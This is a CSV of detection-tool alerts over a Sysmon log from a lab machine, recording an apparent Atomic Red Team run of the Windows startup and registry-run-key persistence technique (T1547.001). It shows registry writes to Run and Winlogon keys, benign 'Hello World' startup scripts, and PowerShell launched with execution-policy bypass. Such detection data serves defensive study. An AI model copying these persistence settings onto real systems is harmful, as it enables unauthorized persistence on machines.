"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-26 11:19:17.557 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173636,"Rule: T1060 ¦ EventType: SetValue ¦ TgtObj: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell ¦ explorer.exe, C:\Windows\explorer.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 1448 ¦ PGUID: E9F06A57-6125-694E-9801-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:17.554","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:18.134 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173640,"Rule: T1060,RunKey ¦ EventType: SetValue ¦ TgtObj: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\calc ¦ calc.exe ¦ Proc: C:\WINDOWS\system32\services.exe ¦ PID: 776 ¦ PGUID: E9F06A57-5FDF-694E-0B00-000000002400","User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:19:18.133","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:19.494 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173649,"Rule: T1031,T1050 ¦ EventType: SetValue ¦ TgtObj: HKLM\System\CurrentControlSet\Control\BootVerificationProgram\ImagePath ¦ C:\Program Files\Internet Explorer\iexplore.exe ¦ Proc: C:\WINDOWS\system32\reg.exe ¦ PID: 7472 ¦ PGUID: E9F06A57-6127-694E-A601-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:19.493","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:19.904 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173652,"Rule: T1042 ¦ EventType: SetValue ¦ TgtObj: HKCR\Directory\background\shell\Size Modify\command\(Default) ¦ C:\Windows\System32\calc.exe ¦ Proc: C:\WINDOWS\system32\reg.exe ¦ PID: 2484 ¦ PGUID: E9F06A57-6127-694E-A901-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:19.903","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:21.058 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173653,"Rule: T1060,RunKey ¦ EventType: SetValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNotibatstartup.bat ¦ DWORD (0x00000004) ¦ Proc: C:\WINDOWS\System32\sihost.exe ¦ PID: 4260 ¦ PGUID: E9F06A57-5FEE-694E-6400-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:21.058","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:21.116 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173654,"Rule: T1060,RunKey ¦ EventType: SetValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNoticalc_exe.lnk ¦ DWORD (0x00000004) ¦ Proc: C:\WINDOWS\System32\sihost.exe ¦ PID: 4260 ¦ PGUID: E9F06A57-5FEE-694E-6400-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:21.115","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:21.131 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173655,"Rule: T1060,RunKey ¦ EventType: SetValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNotijsestartup.jse ¦ DWORD (0x00000004) ¦ Proc: C:\WINDOWS\System32\sihost.exe ¦ PID: 4260 ¦ PGUID: E9F06A57-5FEE-694E-6400-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:21.129","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:21.140 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173656,"Rule: T1060,RunKey ¦ EventType: SetValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNotisocks5_powershell ¦ DWORD (0x00000001) ¦ Proc: C:\WINDOWS\System32\sihost.exe ¦ PID: 4260 ¦ PGUID: E9F06A57-5FEE-694E-6400-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:21.139","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:21.150 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173657,"Rule: T1060,RunKey ¦ EventType: SetValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNotivbsstartup.vbs ¦ DWORD (0x00000004) ¦ Proc: C:\WINDOWS\System32\sihost.exe ¦ PID: 4260 ¦ PGUID: E9F06A57-5FEE-694E-6400-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:21.149","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:27.786 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173658,"Rule: T1042 ¦ EventType: SetValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.exe\OpenWithProgids\exefile ¦ Binary Data ¦ Proc: C:\WINDOWS\Explorer.EXE ¦ PID: 5088 ¦ PGUID: E9F06A57-5FF3-694E-8300-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:27.780","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:31.175 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173659,"Rule: T1060,RunKey ¦ EventType: SetValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNoticalc ¦ DWORD (0x00000000) ¦ Proc: C:\WINDOWS\System32\sihost.exe ¦ PID: 4260 ¦ PGUID: E9F06A57-5FEE-694E-6400-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:31.174","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:31.311 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173660,"Rule: T1060,RunKey ¦ EventType: SetValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNoticalc.exe ¦ DWORD (0x00000003) ¦ Proc: C:\WINDOWS\System32\sihost.exe ¦ PID: 4260 ¦ PGUID: E9F06A57-5FEE-694E-6400-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:31.306","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:50.733 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173670,"Rule: T1042 ¦ EventType: SetValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003_Classes\CLSID\{2cc5ca98-6485-489a-920e-b3e88a6ccce3}\shell\SpotlightClick\command\DelegateExecute ¦ {4813071a-41ad-44a2-9835-886d2f63ca30} ¦ Proc: C:\WINDOWS\Explorer.EXE ¦ PID: 5088 ¦ PGUID: E9F06A57-5FF3-694E-8300-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:50.722","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.431 +01:00","ADS Created","info","DESKTOP-G2OBL3D","Sysmon",15,"","","sysmon",173571,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400 ¦ Hash: MD5=B6DEC52AB53E705337526758B05E4A3C,SHA256=52D464FCC5B72D50B169A45ED8FDEF22792C3FCB683F598B6E605336E53EAF78,IMPHASH=00000000000000000000000000000000","Contents: WScript.Echo(""T1547.001 Hello, World VBS!"") ¦ CreationUtcTime: 2025-12-26 10:18:54.425 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.427","Sysmon_15_Info_ADS-Created.yml","046cac6f-d622-4044-ae0c-1bdbad6210f9","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.432 +01:00","ADS Created","info","DESKTOP-G2OBL3D","Sysmon",15,"","","sysmon",173573,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400 ¦ Hash: MD5=87A774F5DB268320B316AFC6266507F2,SHA256=926CAEFCC44849119F08D11EE4CBE87E1DDA2D22AA5A5E9C16DD7547CD04179C,IMPHASH=00000000000000000000000000000000","Contents: [ZoneTransfer] ZoneId=3 ReferrerUrl=C:\AtomicRedTeam\atomic-red-team-master.zip ¦ CreationUtcTime: 2025-12-26 10:18:54.425 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.431","Sysmon_15_Info_ADS-Created.yml","046cac6f-d622-4044-ae0c-1bdbad6210f9","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.436 +01:00","ADS Created","info","DESKTOP-G2OBL3D","Sysmon",15,"","","sysmon",173575,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400 ¦ Hash: MD5=B6DEC52AB53E705337526758B05E4A3C,SHA256=52D464FCC5B72D50B169A45ED8FDEF22792C3FCB683F598B6E605336E53EAF78,IMPHASH=00000000000000000000000000000000","Contents: WScript.Echo(""T1547.001 Hello, World VBS!"") ¦ CreationUtcTime: 2025-12-26 10:18:54.433 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.433","Sysmon_15_Info_ADS-Created.yml","046cac6f-d622-4044-ae0c-1bdbad6210f9","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.436 +01:00","ADS Created","info","DESKTOP-G2OBL3D","Sysmon",15,"","","sysmon",173577,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400 ¦ Hash: MD5=87A774F5DB268320B316AFC6266507F2,SHA256=926CAEFCC44849119F08D11EE4CBE87E1DDA2D22AA5A5E9C16DD7547CD04179C,IMPHASH=00000000000000000000000000000000","Contents: [ZoneTransfer] ZoneId=3 ReferrerUrl=C:\AtomicRedTeam\atomic-red-team-master.zip ¦ CreationUtcTime: 2025-12-26 10:18:54.433 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.435","Sysmon_15_Info_ADS-Created.yml","046cac6f-d622-4044-ae0c-1bdbad6210f9","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.806 +01:00","ADS Created","info","DESKTOP-G2OBL3D","Sysmon",15,"","","sysmon",173583,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400 ¦ Hash: MD5=D2A9012AA801CBF9027BAE6A39ABB07E,SHA256=E555D0A923B2090E9A4937D658F92CEEF18E1F63ED7C00726E7A965176657C3F,IMPHASH=00000000000000000000000000000000","Contents: WScript.Echo(""T1547.001 Hello, World JSE!"") ¦ CreationUtcTime: 2025-12-26 10:18:55.802 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.803","Sysmon_15_Info_ADS-Created.yml","046cac6f-d622-4044-ae0c-1bdbad6210f9","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.812 +01:00","ADS Created","info","DESKTOP-G2OBL3D","Sysmon",15,"","","sysmon",173585,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400 ¦ Hash: MD5=87A774F5DB268320B316AFC6266507F2,SHA256=926CAEFCC44849119F08D11EE4CBE87E1DDA2D22AA5A5E9C16DD7547CD04179C,IMPHASH=00000000000000000000000000000000","Contents: [ZoneTransfer] ZoneId=3 ReferrerUrl=C:\AtomicRedTeam\atomic-red-team-master.zip ¦ CreationUtcTime: 2025-12-26 10:18:55.802 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.807","Sysmon_15_Info_ADS-Created.yml","046cac6f-d622-4044-ae0c-1bdbad6210f9","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.812 +01:00","ADS Created","info","DESKTOP-G2OBL3D","Sysmon",15,"","","sysmon",173587,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400 ¦ Hash: MD5=D2A9012AA801CBF9027BAE6A39ABB07E,SHA256=E555D0A923B2090E9A4937D658F92CEEF18E1F63ED7C00726E7A965176657C3F,IMPHASH=00000000000000000000000000000000","Contents: WScript.Echo(""T1547.001 Hello, World JSE!"") ¦ CreationUtcTime: 2025-12-26 10:18:55.809 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.811","Sysmon_15_Info_ADS-Created.yml","046cac6f-d622-4044-ae0c-1bdbad6210f9","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.813 +01:00","ADS Created","info","DESKTOP-G2OBL3D","Sysmon",15,"","","sysmon",173589,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400 ¦ Hash: MD5=87A774F5DB268320B316AFC6266507F2,SHA256=926CAEFCC44849119F08D11EE4CBE87E1DDA2D22AA5A5E9C16DD7547CD04179C,IMPHASH=00000000000000000000000000000000","Contents: [ZoneTransfer] ZoneId=3 ReferrerUrl=C:\AtomicRedTeam\atomic-red-team-master.zip ¦ CreationUtcTime: 2025-12-26 10:18:55.809 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.811","Sysmon_15_Info_ADS-Created.yml","046cac6f-d622-4044-ae0c-1bdbad6210f9","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.603 +01:00","ADS Created","info","DESKTOP-G2OBL3D","Sysmon",15,"","","sysmon",173596,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400 ¦ Hash: MD5=BEA90A411BE634A08E21E4F938ACF38E,SHA256=F7235DE2940ED81A2202170AF9873DDBA606192E5809996360BBF3548855F1CE,IMPHASH=00000000000000000000000000000000","Contents: echo "" T1547.001 Hello World Bat"" ¦ CreationUtcTime: 2025-12-26 10:18:57.599 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.601","Sysmon_15_Info_ADS-Created.yml","046cac6f-d622-4044-ae0c-1bdbad6210f9","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.610 +01:00","ADS Created","info","DESKTOP-G2OBL3D","Sysmon",15,"","","sysmon",173598,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400 ¦ Hash: MD5=87A774F5DB268320B316AFC6266507F2,SHA256=926CAEFCC44849119F08D11EE4CBE87E1DDA2D22AA5A5E9C16DD7547CD04179C,IMPHASH=00000000000000000000000000000000","Contents: [ZoneTransfer] ZoneId=3 ReferrerUrl=C:\AtomicRedTeam\atomic-red-team-master.zip ¦ CreationUtcTime: 2025-12-26 10:18:57.599 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.603","Sysmon_15_Info_ADS-Created.yml","046cac6f-d622-4044-ae0c-1bdbad6210f9","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.620 +01:00","ADS Created","info","DESKTOP-G2OBL3D","Sysmon",15,"","","sysmon",173600,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400 ¦ Hash: MD5=BEA90A411BE634A08E21E4F938ACF38E,SHA256=F7235DE2940ED81A2202170AF9873DDBA606192E5809996360BBF3548855F1CE,IMPHASH=00000000000000000000000000000000","Contents: echo "" T1547.001 Hello World Bat"" ¦ CreationUtcTime: 2025-12-26 10:18:57.605 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.613","Sysmon_15_Info_ADS-Created.yml","046cac6f-d622-4044-ae0c-1bdbad6210f9","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.621 +01:00","ADS Created","info","DESKTOP-G2OBL3D","Sysmon",15,"","","sysmon",173602,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400 ¦ Hash: MD5=87A774F5DB268320B316AFC6266507F2,SHA256=926CAEFCC44849119F08D11EE4CBE87E1DDA2D22AA5A5E9C16DD7547CD04179C,IMPHASH=00000000000000000000000000000000","Contents: [ZoneTransfer] ZoneId=3 ReferrerUrl=C:\AtomicRedTeam\atomic-red-team-master.zip ¦ CreationUtcTime: 2025-12-26 10:18:57.605 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.615","Sysmon_15_Info_ADS-Created.yml","046cac6f-d622-4044-ae0c-1bdbad6210f9","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:40.641 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173555,"Cmdline: taskhostw.exe ¦ Proc: C:\Windows\System32\taskhostw.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\System32\svchost.exe -k netsvcs -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-5FE0-694E-E703-000000000000 ¦ PID: 3624 ¦ PGUID: E9F06A57-6100-694E-6601-000000002400 ¦ ParentPID: 1400 ¦ ParentPGUID: E9F06A57-5FE2-694E-1C00-000000002400 ¦ Description: Host Process for Windows Tasks ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=3979F5BBEC9B7637719F9A096400A24A,SHA256=CAAAFB0C6F77CD37F402E644FC56B7D89E3D5FC51E128A4AC49481D281E582F8,IMPHASH=2196268E7A2880E3ADC74481297D0C4B","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-26 10:18:40.628","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:44.301 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173556,"Cmdline: ""C:\WINDOWS\system32\HOSTNAME.EXE"" ¦ Proc: C:\Windows\System32\HOSTNAME.EXE ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1252 ¦ PGUID: E9F06A57-6104-694E-6701-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Hostname APP ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=0411E7CFE0D452AFE541C1EA45033168,SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9,IMPHASH=8CB84C534505B1E47EF25FA2CD9A16BB","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2161 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: hostname.exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:44.297","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:44.376 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173557,"Cmdline: ""C:\WINDOWS\system32\whoami.exe"" ¦ Proc: C:\Windows\System32\whoami.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7732 ¦ PGUID: E9F06A57-6104-694E-6801-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: whoami - displays logged on user information ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=956692DADC5B2CEB46E9219F7A5BEFFA,SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3,IMPHASH=E4464BCD92DF7AC69CCD074CB9C0EFED","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: whoami.exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:44.354","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
